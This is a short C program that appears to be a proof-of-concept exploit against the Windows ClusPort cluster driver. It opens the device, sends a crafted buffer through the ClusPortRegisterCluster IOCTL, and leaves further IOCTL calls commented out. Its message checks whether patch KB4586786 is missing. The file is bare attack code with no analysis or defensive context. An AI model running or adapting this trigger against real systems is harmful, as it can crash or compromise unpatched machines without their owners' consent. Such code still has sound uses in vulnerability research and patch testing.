#include<stdio.h>
#include<windows.h>

ULONG dw;

ULONG inpbuf[0x1000];

HANDLE hDriver;

int main() {

	memset(inpbuf, 0x41, 0x2D0);

	hDriver = CreateFileA("\\\\.\\GLOBALROOT\\Device\\ClusPort", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("The driver does not start or the kb4586786 patch has been applied ");
		getchar();
		return -1;
	}

	//ClusPortRegisterCluster
	for (size_t i = 0; i < 0x2D0; i++)
	{
		inpbuf[i] = 1;
	}
	DeviceIoControl(hDriver, 0x0790803c, inpbuf, 0x2D0, inpbuf, 0x2D0, &dw, NULL);

	////ClusPortControlObjectDeviceControlHandler
	//DeviceIoControl(hDriver, 0x07908048, 0, 0, 0, 0, &dw, NULL);

   
        ////CsvCamSetSecurityInfo
	//DeviceIoControl(hDriver, 0x78BAB74 + 0x49494+8+12, inpbuf, 0x2AC, 0, 0, &dw, NULL);


	////ClusPortUpdateMembership 
	//DeviceIoControl(hDriver, 0x78BAB74 + 0x49494, inpbuf, 0x2AC, 0, 0, &dw, NULL);

	CloseHandle(hDriver);

	return 0;
}
